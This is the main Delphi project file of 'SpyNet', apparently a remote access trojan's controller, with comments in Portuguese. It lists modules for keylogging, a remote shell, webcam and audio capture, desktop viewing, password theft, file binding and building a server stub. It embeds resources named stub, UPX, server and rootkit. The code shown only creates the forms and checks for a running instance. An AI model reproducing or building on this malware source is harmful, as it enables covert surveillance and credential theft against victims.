program SpyNet;
uses
  windows,
  Messages,
  sysutils,
  Forms,
  UnitPrincipal in 'UnitPrincipal.pas' {FormPrincipal},
  UnitPortas in 'UnitPortas.pas' {FormPortas},
  UnitCreateServer in 'UnitCreateServer.pas' {FormCreateServer},
  UnitFormFuncoesDiversas in 'UnitFormFuncoesDiversas.pas' {FormFuncoesDiversas},
  UnitListarDispositivos in 'UnitListarDispositivos.pas' {FormListarDispositivos},
  UnitShell in 'UnitShell.pas' {FormShell},
  UnitRegistry in 'UnitRegistry.pas' {FormRegistry},
  UnitKeylogger in 'UnitKeylogger.pas' {FormKeylogger},
  UnitDesktop in 'UnitDesktop.pas' {FormDesktop},
  UnitWebcam in 'UnitWebcam.pas' {FormWebcam},
  UnitAudio in 'UnitAudio.pas' {FormAudio},
  UnitFileManager in 'UnitFileManager.pas' {FormFileManager},
  UnitPasswords in 'UnitPasswords.pas' {FormPasswords},
  UnitIdiomas in 'UnitIdiomas.pas' {FormIdiomas},
  UnitSearchFiles in 'UnitSearchFiles.pas' {FormSearchFiles},
  UnitSearchKeylogger in 'UnitSearchKeylogger.pas' {FormSearchKeylogger},
  UnitInfo in 'UnitInfo.pas' {FormInfo},
  UnitOpcoesExtras in 'UnitOpcoesExtras.pas' {FormOpcoesExtras},
  UnitBindFiles in 'UnitBindFiles.pas' {FormBindFiles},
  UnitVisualizarLogs in 'UnitVisualizarLogs.pas' {FormVisualizarLogs},
  UnitChatSettings in 'UnitChatSettings.pas' {FormChatSettings},
  UnitCHAT in 'UnitCHAT.pas' {FormCHAT},
  UnitFTPsettings in 'UnitFTPsettings.pas' {FormFTPsettings};

{$R *.res}
{$R 'Settings.res' 'Settings.rc'}
{$R 'Language.res' 'Language.rc'}
{$R 'Profile.res' 'Profile.rc'}
{$R 'Stub.res' 'Stub.rc'}
{$R 'upx.res' 'upx.rc'}
{$R 'server.res' 'server.rc'}
{$R 'image.res' 'image.rc'}
{$R 'funcoes.res' 'funcoes.rc'}
{$R 'sound.res' 'sound.rc'}
{$R 'geoip.res' 'geoip.rc'}
{$R 'rootkit.res' 'rootkit.rc'}
{$R 'sqlite3.res' 'sqlite3.rc'}

procedure VerificarExecucao(AppTitle: string);
var
  xHandle: THandle;
begin
  CreateMutex(nil, False, 'Spy-Net');
  xHandle := findwindow(nil, pchar(AppTitle));

  if (GetLastError = ERROR_ALREADY_EXISTS) and (xHandle <> 0) then
  begin
    // (200) aqui é para esperar a execução do Timer1 do formPrincipal
    // se ele percebe que o mutex existe então o timer restaura a janela hehehe
    CreateMutex(nil, False, 'Pode mostrar essa merda');
    sleep(200);

    showwindow(xHandle, SW_SHOW);
    showwindow(xHandle, SW_SHOWNORMAL);
    Halt(0);
  end;
end;

begin
  Application.Title := 'Spy-Net';
  VerificarExecucao('Spy-Net');
  Application.Initialize;
  Application.CreateForm(TFormPrincipal, FormPrincipal);
  Application.CreateForm(TFormPortas, FormPortas);
  Application.CreateForm(TFormCreateServer, FormCreateServer);
  Application.CreateForm(TFormFuncoesDiversas, FormFuncoesDiversas);
  Application.CreateForm(TFormListarDispositivos, FormListarDispositivos);
  Application.CreateForm(TFormShell, FormShell);
  Application.CreateForm(TFormRegistry, FormRegistry);
  Application.CreateForm(TFormKeylogger, FormKeylogger);
  Application.CreateForm(TFormDesktop, FormDesktop);
  Application.CreateForm(TFormWebcam, FormWebcam);
  Application.CreateForm(TFormAudio, FormAudio);
  Application.CreateForm(TFormFileManager, FormFileManager);
  Application.CreateForm(TFormPasswords, FormPasswords);
  Application.CreateForm(TFormIdiomas, FormIdiomas);
  Application.CreateForm(TFormSearchFiles, FormSearchFiles);
  Application.CreateForm(TFormSearchKeylogger, FormSearchKeylogger);
  Application.CreateForm(TFormInfo, FormInfo);
  Application.CreateForm(TFormOpcoesExtras, FormOpcoesExtras);
  Application.CreateForm(TFormBindFiles, FormBindFiles);
  Application.CreateForm(TFormVisualizarLogs, FormVisualizarLogs);
  Application.CreateForm(TFormChatSettings, FormChatSettings);
  Application.CreateForm(TFormCHAT, FormCHAT);
  Application.CreateForm(TFormFTPsettings, FormFTPsettings);
  Application.Run;
end.
